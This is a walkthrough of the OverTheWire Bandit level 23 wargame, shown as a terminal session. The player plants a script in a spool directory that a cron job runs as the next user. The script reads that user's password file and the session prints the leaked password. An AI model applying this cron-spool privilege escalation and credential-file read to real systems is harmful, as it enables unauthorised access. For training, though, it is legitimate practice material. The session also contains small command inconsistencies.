# LEVEL GOAL

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

# SOLUTION

`nikhilh@ubuntu:~/projects/overthewire-bandit/bandit23$ ssh -p 2220 bandit23@bandit.labs.overthewire.org`

This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
bandit23@bandit.labs.overthewire.org's password: 
               
      ,----..            ,----,          .---. 
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' ' 
  |   :  | ; | ' ;    |.';  ; ;   \  \;      : 
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ; 
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"  
     \   \ .'        ;   |.'       \   \ ;     
  www. `---` ver     '---' he       '---" ire.org     
               
              
Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames. 
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with 
  easily guessable or short names will be periodically deleted!
	
  Please play nice:
      
    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS! 
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro 

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

`bandit23@bandit:~$ cd /etc/cron.d`

`bandit23@bandit:/etc/cron.d$ ls`

`cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  popularity-contest`

`bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24`

`@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null`

`* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null`

`bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh`

`#!/bin/bash`

`myname=$(whoami)`

`cd /var/spool/$myname`

`echo "Executing and deleting all scripts in /var/spool/$myname:"`

`for i in * .*;`

`do`

`    if [ "$i" != "." -a "$i" != ".." ];`

`    then`

`	echo "Handling $i"`

`	timeout -s 9 60 ./$i`

`	rm -f ./$i`

`    fi`

`done`

`bandit23@bandit:/etc/cron.d$ mkdir /tmp/kenshin2`

`bandit23@bandit:/etc/cron.d$ cd /tmp/kenshin24`

`bandit23@bandit:/tmp/kenshin24$ vim get_24_pass.sh`

`bandit23@bandit:/tmp/kenshin24$ cat get_24_pass.sh`

`#! /bin/bash`

`cat /etc/bandit_pass/bandit24 > /tmp/kenshin24/bandit24_pass`

`bandit23@bandit:/tmp$ chmod 777 kenshin24`

`bandit23@bandit:/tmp/kenshin24$ cp get_24_pass.sh /var/spool/bandit24`

`bandit23@bandit:/tmp/kenshin24$ ls`

`bandit24_pass  get_24_pass.sh`

`bandit23@bandit:/tmp/kenshin24$ cat bandit24_pass`

`UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ`
